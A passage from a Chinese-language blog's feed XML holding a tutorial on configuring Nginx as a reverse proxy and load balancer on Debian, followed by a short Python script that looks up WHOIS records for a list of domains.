反代</h1><p>在Debian系统上安装Nginx并配置反向代理到特定的IP地址和端口</p><h2 id="1-更新软件包列表"><a href="#1-更新软件包列表" class="headerlink" title="1. 更新软件包列表"></a>1. 更新软件包列表</h2><p>首先，确保软件包列表是最新的。打开终端并执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><h2 id="2-安装Nginx"><a href="#2-安装Nginx" class="headerlink" title="2. 安装Nginx"></a>2. 安装Nginx</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure><h2 id="配置Nginx作为反向代理"><a href="#配置Nginx作为反向代理" class="headerlink" title=". 配置Nginx作为反向代理"></a>. 配置Nginx作为反向代理</h2><p>安装完成后，需要编辑Nginx的配置文件来设置反向代理。默认情况下，Nginx的配置文件位于&#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default。</p><p>使用喜欢的文本编辑器（如nano或vim）打开此文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure><p>在文件中找到server块，并添加或修改如下配置以设置反向代理。假设要将所有请求代理到192.168.1.100:8080：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Nginx</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name your_domain_or_ip;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://192.168.1.100:8080;</span><br><span class="line">        proxy_set_header Host <span class="variable">$host</span>;</span><br><span class="line">        proxy_set_header X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        proxy_set_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">listen 80; 指定了Nginx监听的端口号，这里使用的是80端口，即HTTP服务的标准端口。</span><br><span class="line">server_name 应该替换为域名或服务器的公网IP地址。</span><br><span class="line">proxy_pass 指令用于指定要代理的目标服务器的URL。</span><br><span class="line">proxy_set_header 指令用于设置转发给后端服务器的请求头信息。</span><br></pre></td></tr></table></figure><h2 id="4-测试配置文件"><a href="#4-测试配置文件" class="headerlink" title="4. 测试配置文件"></a>4. 测试配置文件</h2><p>在保存并退出编辑器之后，测试Nginx配置是否正确无误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -t</span><br></pre></td></tr></table></figure><p>如果输出显示语法正确且测试成功，可以继续下一步。</p><h2 id="5-重新加载Nginx"><a href="#5-重新加载Nginx" class="headerlink" title="5. 重新加载Nginx"></a>5. 重新加载Nginx</h2><p>使更改生效，需要重新加载Nginx服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl reload nginx</span><br></pre></td></tr></table></figure><h2 id="6-验证反向代理工作情况"><a href="#6-验证反向代理工作情况" class="headerlink" title="6. 验证反向代理工作情况"></a>6. 验证反向代理工作情况</h2><p>现在，可以通过浏览器访问域名或服务器的公网IP地址，看看是否能够正确地将请求代理到192.168.1.100:8080。</p><p>如果遇到任何问题，可以查看Nginx的日志文件来诊断问题。错误日志通常位于&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log。</p><h2 id="Nginx中配置多个反向代理目标"><a href="#Nginx中配置多个反向代理目标" class="headerlink" title="Nginx中配置多个反向代理目标"></a>Nginx中配置多个反向代理目标</h2><p>可以使用upstream模块来定义一个负载均衡池。<br>Nginx可以根据配置的策略（例如轮询、最少连接等）将请求分发到不同的后端服务器。</p><p>以下是具体步骤：</p><h2 id="1-编辑Nginx配置文件"><a href="#1-编辑Nginx配置文件" class="headerlink" title="1. 编辑Nginx配置文件"></a>1. 编辑Nginx配置文件</h2><p>打开Nginx的配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo nano /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure><h2 id="2-添加upstream块"><a href="#2-添加upstream块" class="headerlink" title="2. 添加upstream块"></a>2. 添加upstream块</h2><p>在配置文件的顶部或适当位置添加一个upstream块，定义后端服务器池：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Nginx</span><br><span class="line">upstream backend_servers &#123;</span><br><span class="line">    server 192.168.1.100:8080;</span><br><span class="line">    server 192.168.1.101:8081;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-修改server块"><a href="#3-修改server块" class="headerlink" title="3. 修改server块"></a>3. 修改server块</h2><p>在server块中，将proxy_pass指令指向刚刚定义的upstream块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Nginx</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name your_domain_or_ip;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://backend_servers;</span><br><span class="line">        proxy_set_header Host <span class="variable">$host</span>;</span><br><span class="line">        proxy_set_header X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        proxy_set_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-测试配置文件-1"><a href="#4-测试配置文件-1" class="headerlink" title="4. 测试配置文件"></a>4. 测试配置文件</h2><p>保存并退出编辑器后，测试Nginx配置是否正确无误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -t</span><br></pre></td></tr></table></figure><h2 id="5-重新加载Nginx-1"><a href="#5-重新加载Nginx-1" class="headerlink" title="5. 重新加载Nginx"></a>5. 重新加载Nginx</h2><p>如果测试成功，重新加载Nginx以使更改生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl reload nginx</span><br></pre></td></tr></table></figure><h2 id="6-验证配置"><a href="#6-验证配置" class="headerlink" title="6. 验证配置"></a>6. 验证配置</h2><p>通过浏览器访问域名或服务器的公网IP地址，检查请求是否正确地被分发到两个后端服务器。</p><h2 id="7-进一步配置（可选）"><a href="#7-进一步配置（可选）" class="headerlink" title="7. 进一步配置（可选）"></a>7. 进一步配置（可选）</h2><p>如果需要更复杂的负载均衡策略，可以在upstream块中添加更多选项。例如：</p><p>轮询（默认）：每个请求按时间顺序逐一分配到不同的服务器，如果后端某个服务器宕机，能自动剔除。<br>最少连接：请求分配给连接数最少的服务器。<br>IP哈希：每个请求按访问客户端的IP哈希结果分配，这样来自同一客户端的请求会分配到同一台后端服务器。<br>示例配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Nginx</span><br><span class="line"></span><br><span class="line">upstream backend_servers &#123;</span><br><span class="line">    <span class="comment"># 轮询（默认）</span></span><br><span class="line">    server 192.168.1.100:8080;</span><br><span class="line">    server 192.168.1.101:8081;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 最少连接</span></span><br><span class="line">    <span class="comment"># least_conn;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># IP哈希</span></span><br><span class="line">    <span class="comment"># ip_hash;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="负载均衡策略及其配置方法："><a href="#负载均衡策略及其配置方法：" class="headerlink" title="负载均衡策略及其配置方法："></a>负载均衡策略及其配置方法：</h1><h2 id="1-轮询（默认）"><a href="#1-轮询（默认）" class="headerlink" title="1. 轮询（默认）"></a>1. 轮询（默认）</h2><p>轮询是Nginx默认的负载均衡策略，每个请求按时间顺序逐一分配到不同的服务器。如果后端某个服务器宕机，Nginx会自动将其从轮询列表中剔除。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upstream backend_servers &#123;</span><br><span class="line">    server 192.168.1.100:8080;</span><br><span class="line">    server 192.168.1.101:8081;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-最少连接"><a href="#2-最少连接" class="headerlink" title="2. 最少连接"></a>2. 最少连接</h2><p>最少连接策略将请求分配给当前连接数最少的服务器，适用于处理长连接的场景。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upstream backend_servers &#123;</span><br><span class="line">    least_conn;</span><br><span class="line">    server 192.168.1.100:8080;</span><br><span class="line">    server 192.168.1.101:8081;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-IP哈希"><a href="#3-IP哈希" class="headerlink" title="3. IP哈希"></a>3. IP哈希</h2><p>IP哈希策略根据客户端的IP地址进行哈希运算，确保来自同一客户端的请求总是被分配到同一台后端服务器。这在会话保持（Session Stickiness）场景中非常有用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upstream backend_servers &#123;</span><br><span class="line">    ip_hash;</span><br><span class="line">    server 192.168.1.100:8080;</span><br><span class="line">    server 192.168.1.101:8081;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-加权轮询"><a href="#4-加权轮询" class="headerlink" title="4. 加权轮询"></a>4. 加权轮询</h2><p>加权轮询允许为每个后端服务器分配权重，权重越高，被分配到请求的概率越大。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upstream backend_servers &#123;</span><br><span class="line">    server 192.168.1.100:8080 weight=3;</span><br><span class="line">    server 192.168.1.101:8081 weight=1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-备用服务器"><a href="#5-备用服务器" class="headerlink" title="5. 备用服务器"></a>5. 备用服务器</h2><p>可以指定备用服务器，当主服务器不可用时，请求会被转发到备用服务器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upstream backend_servers &#123;</span><br><span class="line">    server 192.168.1.100:8080;</span><br><span class="line">    server 192.168.1.101:8081 backup;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-组合策略"><a href="#6-组合策略" class="headerlink" title="6. 组合策略"></a>6. 组合策略</h2><p>也可以组合使用多种策略，例如同时使用IP哈希和加权轮询。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upstream backend_servers &#123;</span><br><span class="line">    ip_hash;</span><br><span class="line">    server 192.168.1.100:8080 weight=3;</span><br><span class="line">    server 192.168.1.101:8081 weight=1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-测试和应用配置"><a href="#7-测试和应用配置" class="headerlink" title="7. 测试和应用配置"></a>7. 测试和应用配置</h2><p>完成配置后，测试Nginx配置文件是否正确无误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -t</span><br></pre></td></tr></table></figure><p>如果测试成功，重新加载Nginx以使更改生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl reload nginx</span><br></pre></td></tr></table></figure><h2 id="8-验证配置"><a href="#8-验证配置" class="headerlink" title="8. 验证配置"></a>8. 验证配置</h2><p>通过浏览器或其他工具访问域名或服务器的公网IP地址，检查请求是否按预期被分发到不同的后端服务器。<br>使用日志或后端服务器上的访问记录来验证负载均衡的效果。</p><p>通过这些配置，可以实现更灵活和强大的负载均衡策略，以满足不同业务场景的需求。</p><h2 id="完整的Nginx配置示例"><a href="#完整的Nginx配置示例" class="headerlink" title="完整的Nginx配置示例"></a>完整的Nginx配置示例</h2><p>完整的Nginx配置示例，其中包含两台主用服务器和一台备用服务器。<br>这个配置将使用轮询策略，并且备用服务器将在主用服务器不可用时接管请求。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/nginx/sites-available/default</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义上游服务器组</span></span><br><span class="line">upstream backend_servers &#123;</span><br><span class="line">    <span class="comment"># 主用服务器</span></span><br><span class="line">    server 192.168.1.100:8080;</span><br><span class="line">    server 192.168.1.101:8081;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 备用服务器</span></span><br><span class="line">    server 192.168.1.102:8082 backup;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义服务器块</span></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name your_domain_or_ip;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义location块</span></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://backend_servers;</span><br><span class="line">        proxy_set_header Host <span class="variable">$host</span>;</span><br><span class="line">        proxy_set_header X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        proxy_set_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 可选：定义错误页面</span></span><br><span class="line">    error_page 404 /404.html;</span><br><span class="line">    location = /404.html &#123;</span><br><span class="line">        internal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page 500 502 503 504 /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        internal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>upstream 块:</strong><br>server 192.168.1.100:8080; 和 server 192.168.1.101:8081; 是两台主用服务器。<br>server 192.168.1.102:8082 backup; 是一台备用服务器，只有在主用服务器不可用时才会被使用。<br><strong>server 块:</strong><br>listen 80; 指定了Nginx监听的端口号，这里是80端口。<br>server_name your_domain_or_ip; 应该替换为域名或服务器的公网IP地址。<br><strong>location 块:</strong><br>proxy_pass <a class="link"   href="http://backend_servers/" >http://backend_servers<i class="fas fa-external-link-alt"></i></a>; 将请求代理到定义的上游服务器组。<br>proxy_set_header 指令用于设置转发给后端服务器的请求头信息。<br><strong>错误页面:</strong><br>error_page 404 &#x2F;404.html; 和 location &#x3D; &#x2F;404.html { internal; } 用于定义404错误页面。<br>error_page 500 502 503 504 &#x2F;50x.html; 和 location &#x3D; &#x2F;50x.html { internal; } 用于定义500系列错误页面。</p><p>日志:<br>查看Nginx的访问日志和错误日志，确保一切正常：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Bash</span><br><span class="line"></span><br><span class="line">sudo tail -f /var/log/nginx/access.log</span><br><span class="line">sudo tail -f /var/log/nginx/error.log</span><br></pre></td></tr></table></figure><p>以实现两台主用服务器和一台备用服务器的负载均衡。</p><!--inotify+rsync实时同步https://cloud.tencent.com/developer/article/1373541https://www.cnblogs.com/hxqwe/p/18298664->]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Keepalived&quot;&gt;&lt;a href=&quot;#Keepalived&quot; class=&quot;headerlink&quot; title=&quot;Keepalived&quot;&gt;&lt;/a&gt;Keepalived&lt;/h1&gt;&lt;p&gt;是一种用于实现高可用性的工具，它通过VRRP（虚拟路由冗余协议）来管理虚拟I</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="nigix" scheme="https://banjinmei.github.io/tags/nigix/"/>
    
    <category term="keepalived" scheme="https://banjinmei.github.io/tags/keepalived/"/>
    
    <category term="inotify" scheme="https://banjinmei.github.io/tags/inotify/"/>
    
    <category term="rsync" scheme="https://banjinmei.github.io/tags/rsync/"/>
    
  </entry>
  
  <entry>
    <title>python whoisdomain</title>
    <link href="https://banjinmei.github.io/2024/11/21/python-whoisdomain/"/>
    <id>https://banjinmei.github.io/2024/11/21/python-whoisdomain/</id>
    <published>2024-11-21T15:31:52.000Z</published>
    <updated>2024-11-21T15:32:33.020Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install python-whois</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> whois</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件中的域名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_domains_from_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        domains = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> file <span class="keyword">if</span> line.strip()]</span><br><span class="line">    <span class="keyword">return</span> domains</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询域名的WHOIS信息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query_whois</span>(<span class="params">domain</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        domain_info = whois.whois(domain)</span><br><span class="line">        <span class="keyword">if</span> domain_info.domain_name:</span><br><span class="line">            <span class="keyword">return</span> domain_info</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error querying WHOIS for <span class="subst">&#123;domain&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存查询结果到文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_results_to_file</span>(<span class="params">domains, results, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> domain, result <span class="keyword">in</span> results.items():</span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                file.write(<span class="string">f&quot;Domain: <span class="subst">&#123;domain&#125;</span>\n&quot;</span>)</span><br><span class="line">                file.write(<span class="string">&quot;WHOIS Information:\n&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> key, value <span class="keyword">in</span> result.items():</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, <span class="built_in">list</span>):</span><br><span class="line">                        <span class="keyword">for</span> item <span class="keyword">in</span> value:</span><br><span class="line">                            file.write(<span class="string">f&quot;<span class="subst">&#123;key&#125;</span>: <span class="subst">&#123;item&#125;</span>\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        file.write(<span class="string">f&quot;<span class="subst">&#123;key&#125;</span>: <span class="subst">&#123;value&#125;</span>\n&quot;</span>)</span><br><span class="line">                file.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file.write(<span class="string">f&quot;Domain: <span class="subst">&#123;domain&#125;</span> - Not Registered\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    file_path = <span class="string">&#x27;12.txt&#x27;</span>  <span class="comment"># 文件路径</span></span><br><span class="line">    output_file = <span class="string">&#x27;whois_results2.txt&#x27;</span>  <span class="comment"># 输出文件路径</span></span><br><span class="line">    domains = read_domains_from_file(file_path)</span><br><span class="line">    </span><br><span class="line">    results = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> domain <span class="keyword">in</span> domains:</span><br><span class="line">        domain_info = query_whois(domain)</span><br><span class="line">        results[domain] = domain_info</span><br><span class="line">    </span><br><span class="line">    save_results_to_file(domains, results, output_file)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;WHOIS results have been saved to <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="技术" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="python" scheme="https://banjinmei.github.io/tags/python/"/>
    
  </entry>
  
</feed>
